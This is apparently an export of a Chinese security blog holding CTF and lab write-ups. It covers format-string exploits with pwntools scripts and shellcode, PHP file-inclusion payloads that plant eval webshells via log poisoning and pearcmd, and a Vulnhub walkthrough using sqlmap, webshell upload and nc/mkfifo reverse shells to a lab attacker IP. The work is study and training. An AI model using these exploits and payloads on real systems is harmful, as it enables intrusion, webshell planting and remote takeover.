<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181932606.png" alt="屏幕截图 2024-01-30 185641"></p>
<p>​	因此我们现在要换个写法构造<code>payload</code>，<code>payload = b&#39;%9$saaaa&#39;+p64(puts_got)</code>这样我们可以看到<code>&#39;00&#39;</code>就在后面了，有用的字符串也就不会再被截断了。<code>9</code>是因为现在<code>p64(puts_got)</code>变成了第<code>2</code>个参数了。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181932056.png" alt="屏幕截图 2024-01-30 191730"></p>
<p>​	刚开始我泄漏的是<code>printf</code>函数的<code>got</code>表值，但是不知道为什么一直不成功，后来看别的师傅的<code>wp</code>泄漏的都是<code>puts</code>函数就可以，后来我用<code>read,strlen</code>这些函数都可以。然后我发现<code>puts</code>函数发送的是<code>0x601018</code>（重定位前），接收的是<code>0x7fd7f1458690</code>（重定位后）</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181932500.png" alt="屏幕截图 2024-01-30 184334"></p>
<p>​	而<code>printf</code>函数发送的与接收的一样都是<code>0x601030</code>，也就是说并没有泄漏出<code>printf</code>重定位后的<code>got</code>表值，所以就不能泄漏<code>printf</code>的<code>got</code>表值</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181932215.png" alt="屏幕截图 2024-01-30 184858"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload1 = <span class="string">b&#x27;%9$saaaa&#x27;</span>+p64(puts_got)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Please tell me:&#x27;</span>,payload1)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">base_addr = puts_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr = base_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">strlen_addr = base_addr+libc.sym[<span class="string">&#x27;strlen&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;system_add =&gt;&#x27;</span>,<span class="built_in">hex</span>(sys_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;strlen_add =&gt;&#x27;</span>,<span class="built_in">hex</span>(strlen_addr))</span><br></pre></td></tr></table></figure>

<p>​	打印出来他们的地址，发现只有后<code>3</code>个字节不一样，我们只需要修改后<code>3</code>个字节即可</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181932156.png" alt="image-20240130193456108"></p>
<p>​	同<code>32</code>位，分别表示出这<code>3</code>个字节</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sys_addr1 = system_addr&amp;<span class="number">0xff</span></span><br><span class="line">sys_addr2 = (system_addr&amp;<span class="number">0xff00</span>)&gt;&gt;<span class="number">8</span></span><br><span class="line">sys_addr3 = (system_addr&amp;<span class="number">0xff0000</span>)&gt;&gt;<span class="number">16</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys1 =&gt;&#x27;</span>,<span class="built_in">hex</span>(sysaddr1)) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys2 =&gt;&#x27;</span>,<span class="built_in">hex</span>(sysaddr2)) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys3 =&gt;&#x27;</span>,<span class="built_in">hex</span>(sysaddr3))  </span><br><span class="line"><span class="comment">#9是输出的“Repeater:”的字符数</span></span><br><span class="line">sys_addr1_value = sys_addr1-<span class="number">9</span></span><br><span class="line">result = sys_addr2-sys_addr1</span><br><span class="line">sys_addr2_value=result <span class="keyword">if</span> result&gt;<span class="number">0</span> <span class="keyword">else</span> result+<span class="number">0x100</span></span><br><span class="line">result = sys_addr3-sys_addr2</span><br><span class="line">sys_addr3_value=result <span class="keyword">if</span> result&gt;<span class="number">0</span> <span class="keyword">else</span> result+<span class="number">0x100</span></span><br></pre></td></tr></table></figure>

<p>​	构造第二个<code>payload</code>的时候同样不能和<code>32</code>位的题一样了，<code>payload2 = b&#39;%&#39;+bytes(str(sysaddr1_value),encoding=&#39;utf-8&#39;)+b&#39;c&#39;+b&#39;%13$hhn&#39; </code>的意思是将<code>sys_addr1_value</code>的值作为字符写入到第<code>13</code>个参数所指向的内存地址中，<code>%hhn</code>是只修改<code>1</code>个字符的意思。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload2 = <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(sys_addr1_value),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%13$hhn&#x27;</span> </span><br><span class="line"><span class="comment">#将会使用格式化字符串漏洞将sysaddr1_value的值作为字符写入到第13个参数所指向的内存地址中。</span></span><br><span class="line">payload2 += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(sys_addr2_value),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%14$hhn&#x27;</span> </span><br><span class="line">payload2 += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(sys_addr3_value),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%15$hhn&#x27;</span> </span><br><span class="line">payload2 = payload2.ljust(<span class="number">40</span>,<span class="string">b&#x27;a&#x27;</span>)  <span class="comment">#意思是把payload填充到8的整数倍，由于是64位的栈上的地址或者数据都是8个字节的，也就是说8个字节占一个参数位，这里是5倍也就是5个参数，第一个参数的偏移量是8，9，10，11，12</span></span><br><span class="line">payload2 += p64(strlen_got)+p64(strlen_got+<span class="number">1</span>)+p64(strlen_got+<span class="number">2</span>)</span><br><span class="line"><span class="comment">#          第13个参数         第14个参数          第15个参数</span></span><br><span class="line"><span class="comment">#综上所述，当对目标地址加一（进行偏移）时，读取到的真实地址就也在变化，这样，我们就可以确定真实地址的每一位所在的位置了</span></span><br></pre></td></tr></table></figure>

<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a><code>exp</code></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;)</span></span><br><span class="line"><span class="comment">#p = process(&quot;./fmt64&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26762</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./fmt64&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">strlen_got = elf.got[<span class="string">&#x27;strlen&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;%9$saaaa&#x27;</span>+p64(puts_got)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Please tell me:&#x27;</span>,payload1)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">base_addr = puts_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr = base_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">strlen_addr = base_addr+libc.sym[<span class="string">&#x27;strlen&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;system_add =&gt;&#x27;</span>,<span class="built_in">hex</span>(sys_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;strlen_add =&gt;&#x27;</span>,<span class="built_in">hex</span>(strlen_addr))</span><br><span class="line"></span><br><span class="line">sys_addr1 = system_addr&amp;<span class="number">0xff</span></span><br><span class="line">sys_addr2 = (system_addr&amp;<span class="number">0xff00</span>)&gt;&gt;<span class="number">8</span></span><br><span class="line">sys_addr3 = (system_addr&amp;<span class="number">0xff0000</span>)&gt;&gt;<span class="number">16</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys1 =&gt;&#x27;</span>,<span class="built_in">hex</span>(sys_addr1)) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys2 =&gt;&#x27;</span>,<span class="built_in">hex</span>(sys_addr2)) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys3 =&gt;&#x27;</span>,<span class="built_in">hex</span>(sys_addr3))  </span><br><span class="line">sys_addr1_value = sys_addr1-<span class="number">9</span></span><br><span class="line">result = sys_addr2-sys_addr1</span><br><span class="line">sys_addr2_value=result <span class="keyword">if</span> result&gt;<span class="number">0</span> <span class="keyword">else</span> result+<span class="number">0x100</span></span><br><span class="line">result = sys_addr3-sys_addr2</span><br><span class="line">sys_addr3_value=result <span class="keyword">if</span> result&gt;<span class="number">0</span> <span class="keyword">else</span> result+<span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(sys_addr1_value),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%13$hhn&#x27;</span> </span><br><span class="line">payload2 += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(sys_addr2_value),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%14$hhn&#x27;</span> </span><br><span class="line">payload2 += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(sys_addr3_value),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%15$hhn&#x27;</span> </span><br><span class="line">payload2 = payload2.ljust(<span class="number">40</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload2 += p64(strlen_got)+p64(strlen_got+<span class="number">1</span>)+p64(strlen_got+<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">payload3 = <span class="string">b&#x27;;/bin/sh\x00&#x27;</span></span><br><span class="line">p.sendline(payload3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181932713.png" alt="image-20240130195341584"></p>
<h2 id="hitcontraining-playfmt（ebp链）"><a href="#hitcontraining-playfmt（ebp链）" class="headerlink" title="hitcontraining_playfmt（ebp链）"></a><code>hitcontraining_playfmt</code>（<code>ebp</code>链）</h2><h3 id="保护-源码"><a href="#保护-源码" class="headerlink" title="保护&amp;源码"></a>保护&amp;源码</h3><p>​	查看保护，<code>32</code>位程序，有<code>RWX</code>段我们第一时间想到用<code>shellcode</code>。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181932093.png" alt="image-20240209202319987"></p>
<p>源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">do_fmt</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0xC8u</span>);</span><br><span class="line">    result = <span class="built_in">strncmp</span>(buf, <span class="string">&quot;quit&quot;</span>, <span class="number">4u</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>​	分析代码，<code>printf(buf)</code>格式化字符串漏洞，<code>buf</code>在<code>.bss</code>段。大概思路就是利用格式化字符串漏洞修改函数返回地址为<code>buf</code>的起始地址<code>+4</code>（因为执行<code>ret</code>指令就需要跳出循环，就需要<code>buf</code>的前<code>4</code>个字节是<code>quit</code>），最后发送<code>shellcode</code>。</p>
<p>​	下图中<code>ebp</code>下面的<code>0xffffd07c</code>这个地址中放的是函数返回地址，我们可以把<code>0xffffd098</code>改成<code>0xffffd07c</code>，这样<code>0xffffd088 -&gt; 0xffffd098</code>就变成了<code>0xffffd088 -&gt; 0xffffd07c -&gt; 0x80485ad(play+77)</code>，我们也就可以修改<code>0xffffd07c</code>中的内容即返回地址为<code>shellcode</code>的首地址了。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181932681.png" alt="屏幕截图 2024-02-09 202808"></p>
<h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a><code>exp</code></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28906</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Server&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;=\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;%6$p&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(p.recv(<span class="number">10</span>),<span class="number">16</span>)-<span class="number">0x28</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack_addr+<span class="number">0x1c</span>)&amp;<span class="number">0xff</span>).encode()+<span class="string">b&#x27;c%6$hhn&#x27;</span> </span><br><span class="line">payload = payload.ljust(<span class="number">200</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa064</span>).encode()+<span class="string">b&#x27;c%10$hn&#x27;</span> </span><br><span class="line">payload = payload.ljust(<span class="number">200</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">xor ebx,ebx</span></span><br><span class="line"><span class="string">push ebx</span></span><br><span class="line"><span class="string">push 0x68732f2f</span></span><br><span class="line"><span class="string">push 0x6e69622f</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">push 11</span></span><br><span class="line"><span class="string">pop eax</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;quit&#x27;</span>+shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181932757.png" alt="image-20240209212128942"></p>
]]></content>
      <categories>
        <category>pwn学习总结</category>
        <category>栈</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>格式化字符串漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>裸文件包含</title>
    <url>/2025/02/08/%E8%A3%B8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<p>[TOC]</p>
<span id="more"></span>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;file://&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="日志文件包含利用"><a href="#日志文件包含利用" class="headerlink" title="日志文件包含利用"></a>日志文件包含利用</h2><p>前置知识：</p>
<blockquote>
<p>Apache服务器运行后会生成两个日志文件，这两个文件是access.log(访问日志)和error.log(错误日志)，apache的日志文件记录下我们的操作，并且写到访问日志文件access.log之中。</p>
</blockquote>
<p>注意：因为浏览器会将url中的一些字符进行urlencode编码，为了不让记录到access.log中的内容被编码，要用bp抓包写入payload并发送。</p>
<p>以上面提到的漏洞代码为例，假设漏洞文件为exp.php：</p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/<span class="meta">&lt;?php</span> <span class="variable">$fp</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;1.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>);<span class="title function_ invoke__">fputs</span>(<span class="variable">$fp</span>,<span class="string">&#x27;&lt;?php @eval($_POST[1])?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>bp发送上面payload，然后访问exp.php?file&#x3D;<strong>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</strong>，便会在exp.php同目录下生成1.php文件，其内含我们写入的马，蚁剑连接<a href="http://192.168.1.9/exp.php?file=1.php%E5%8D%B3%E5%8F%AF%E3%80%82">http://192.168.1.9/exp.php?file=1.php即可。</a></p>
<h2 id="pearcmd-php的利用"><a href="#pearcmd-php的利用" class="headerlink" title="pearcmd.php的利用"></a>pearcmd.php的利用</h2><p>注意：</p>
<ol>
<li><strong>该攻击方法的前提是php开启了register_argc_argv。</strong></li>
<li>Docker中pearcmd.php的默认在&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;路径下。</li>
</ol>
<p>pear命令有一个参数是config-create，而这个命令又需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中。</p>
<p>同样以上面的漏洞代码为例，还是要用bp，不过这次注意要在把包给到Repeater前修改参数。</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">+config-create+<span class="regexp">/&amp;file=/usr</span><span class="regexp">/local/lib</span><span class="regexp">/php/pearcmd</span>.php&amp;&lt;<span class="string">?=</span><span class="variable">@eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>])<span class="string">?&gt;</span>+<span class="regexp">/tmp/a</span>.php</span><br></pre></td></tr></table></figure>

<p>参考文章：</p>
<p><a href="https://blog.csdn.net/weixin_45588247/article/details/119401092">【文件包含漏洞】——文件包含漏洞进阶_日志文件包含利用_文件包含漏洞 apache日志-CSDN博客</a></p>
<p><a href="https://www.cnblogs.com/endermanneer/p/18186330">利用pearcmd实现裸文件包含 - endermanneer - 博客园</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp">Docker PHP裸文件本地包含综述 | 离别歌</a></p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试靶机vulnhub_AI-WEB-1.0通关记录</title>
    <url>/2024/11/19/%E8%AE%B0%E5%BD%95%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%89%93%E9%9D%B6%E5%9C%BA/</url>
    <content><![CDATA[<p>最近想打打靶场，找了几个入门靶场来渗透测试了一下，vulnhub的AI-WEB-1.0这个是我打的第一个靶机，整个过程还是比较顺利的(毕竟是入门级的)。</p>
<span id="more"></span>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="扫描主机"><a href="#扫描主机" class="headerlink" title="扫描主机"></a>扫描主机</h3><p>使用<code>netdiscover</code>发现主机</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netdiscover -i eth0 -r 192.168.30.0/24</span><br><span class="line"><span class="comment"># eth0是网卡设备名</span></span><br><span class="line"><span class="comment"># 扫描192.168.30.0/24这个网段，检查在线主机</span></span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112246262.png" alt="image-20241119153806356" style="zoom: 50%;" />

<h3 id="扫描端口"><a href="#扫描端口" class="headerlink" title="扫描端口"></a>扫描端口</h3><p>使用<code>nmap</code>扫描存活主机的端口</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -A -n 192.168.30.132</span><br><span class="line">nmap -T4 -A 192.168.30.132</span><br></pre></td></tr></table></figure>

<p>只得到<code>80</code>端口</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112246056.png" alt="image-20241119154532963" style="zoom:50%;" />

<p>浏览器访问一下<code>192.168.30.132:80</code>，好吧果然什么都没有</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255136.png" alt="image-20241119154840588" style="zoom:50%;" />

<h3 id="扫描目录"><a href="#扫描目录" class="headerlink" title="扫描目录"></a>扫描目录</h3><p>使用<code>dirb</code>扫描目录<br>参考：<a href="https://www.cnblogs.com/xiaoyus/p/18418624">DIRB：一款强大的Web目录扫描工具使用指南</a></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.30.132 -o dirb.txt</span><br><span class="line"><span class="comment">#参数: -o 输出结果</span></span><br><span class="line"><span class="comment">#扫描192.168.30.132主机上的所有目录，并将其输出到dirb.txt中</span></span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255532.png" alt="image-20241119155905008" style="zoom:50%;" />

<p>直接访问<code>url</code></p>
<p><code>http://192.168.30.132/server-status</code>，无权限</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255616.png" alt="image-20241119160259061" style="zoom:50%;" />

<p><code>http://192.168.30.132/robots.txt</code>，发现两个目录</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255633.png" alt="image-20241119160218025" style="zoom:50%;" />

<p>访问这两个目录，都是无权限，下面再使用<code>dirb</code>扫描这两个目录</p>
<p><code>/m3diNf0/</code>目录：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255143.png" alt="image-20241119160816299" style="zoom: 67%;" />

<p>访问<code>http://192.168.30.132/m3diNf0/info.php</code>，是<code>php</code>配置文件，在里面发现了网站的绝对路径</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255301.png" alt="image-20241119161053952" style="zoom: 50%;" />

<p><code>/se3reTdir777/</code>目录：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255354.png" alt="image-20241119161459503" style="zoom:67%;" />

<p>访问<code>http://192.168.30.132/se3reTdir777/index.php</code>，看起来是一个<code>sql</code>注入漏洞</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255478.png" alt="image-20241119195135072" style="zoom: 67%;" />

<p>访问<code>http://192.168.30.132/se3reTdir777/uploads/</code>，无权限</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255614.png" alt="image-20241119195407387" style="zoom:50%;" />

<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a><code>sql</code>注入</h3><p>先<code>bp</code>抓包一下，确定是<code>POST</code>传参并找到注入点</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255089.png" alt="image-20241119195241615" style="zoom:50%;" />

<p>使用<code>sqlmap</code>工具进行<code>sql</code>注入</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.30.132/se3reTdir777/&quot;</span> --data <span class="string">&quot;uid=11&amp;Operation=Submit&quot;</span> --dbs</span><br><span class="line"><span class="comment">#列出全部数据库</span></span><br><span class="line"><span class="comment">#aiweb1,information_schema</span></span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255859.png" alt="image-20241119200926142" style="zoom: 67%;" />

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.30.132/se3reTdir777/&quot;</span> --data <span class="string">&quot;uid=1&amp;Operation=Submit&quot;</span> -D aiweb1 --tables</span><br><span class="line"><span class="comment">#列表</span></span><br><span class="line"><span class="comment">#user,systemUser</span></span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255399.png" alt="image-20241119200941269" style="zoom: 67%;" />

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.30.132/se3reTdir777/&quot;</span> --data <span class="string">&quot;uid=1&amp;Operation=Submit&quot;</span> -D aiweb1 -T user --columns</span><br><span class="line"><span class="comment">#列字段</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://192.168.30.132/se3reTdir777/&quot;</span> --data <span class="string">&quot;uid=1&amp;Operation=Submit&quot;</span> -D aiweb1 -T user --columns -dump</span><br><span class="line"><span class="comment">#再加一个参数 -dump 可以把字段里的内容也列出来，或者不加--columns，只列字段里的内容</span></span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255528.png" alt="image-20241119201916635" style="zoom:50%;" />

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.30.132/se3reTdir777/&quot;</span> --data <span class="string">&quot;uid=1&amp;Operation=Submit&quot;</span> -D  aiweb1 -T systemUser -dump</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255163.png" alt="image-20241119202638863" style="zoom:50%;" />

<p>尝试<code>--os-shell</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.30.132/se3reTdir777/&quot;</span> --data <span class="string">&quot;uid=1&amp;Operation=Submit&quot;</span> --os-shell</span><br><span class="line"><span class="comment">#/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads</span></span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255054.png" alt="image-20241119203738412" style="zoom:50%;" />

<p>第一个选<code>4(PHP)</code>，第二个选项选<code>2</code>(自定义目录位置)，这里需要提供绝对路径</p>
<p>​	<strong>前面在<code>php</code>配置文件中我们找到了网站的绝对路径为<code>/home/www/html/web1x443290o2sdf92213/</code>，扫描<code>/se3reTdir777/</code>目录时，出现了<code>/se3reTdir777/index.php</code>和<code>/se3reTdir777/uploads/</code>两个路径，访问这两个路径都存在<code>sql</code>注入漏洞，所以这里我两个路径都尝试了一下，<code>uploads/</code>这个对了。</strong></p>
<p>拿到<code>shell</code>，但是权限较低是<code>www-data</code></p>
<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p><code>hack.php</code>，本地的一句话木马文件</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255275.png" alt="image-20241119210831951"></p>
<p>使用<code>sqlmap</code>上传<code>hack.php</code>文件</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.30.132/se3reTdir777/&quot;</span> --data <span class="string">&quot;uid=1&amp;Operation=Submit&quot;</span> --file-write ./hack.php --file-dest /home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/hack.php</span><br></pre></td></tr></table></figure>

<ul>
<li><strong><code>--file-read</code>：从后端<code>DBMS</code>文件系统读取文件</strong></li>
<li><strong><code>--file-write</code>：在后端<code>DBMS</code>文件系统上写入本地文件</strong></li>
<li><strong><code>--file-dest</code>：要写入的文件在<code>DBMS</code>上的绝对路径</strong></li>
</ul>
<p>然后使用蚁剑连接</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255001.png" alt="image-20241119210041331" style="zoom:50%;" />

<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹<code>shell</code></h3><p>在<code>kali</code>本地监听 <code>nc -lvvp 6666</code></p>
<p>在蚁剑虚拟终端上<code>nc</code>反弹，发现参数<code>-e</code>不可用</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.30.130 6666</span><br><span class="line"><span class="comment">#192.168.30.130是kali的IP地址</span></span><br></pre></td></tr></table></figure>

<p>在蚁剑终端上创建反向<code>shell</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span> /tmp/f;<span class="built_in">mkfifo</span> /tmp/f;<span class="built_in">cat</span> /tmp/f|/bin/sh -i 2&gt;&amp;1 | nc 192.168.30.130 6666 &gt;/tmp/f</span><br></pre></td></tr></table></figure>

<ul>
<li><strong><code>mkfifo /tmp/f</code>：创建一个命令管道(<code>FIFO</code>)，命名为<code>/tmp/f</code>。命名管道允许进程间的通信。</strong></li>
<li><strong><code>cat /tmp/f</code>：读取<code>/tmp/f</code>文件的内容。由于<code>/tmp/f</code>是一个命名管道，这个命令会等待数据被写入管道。</strong></li>
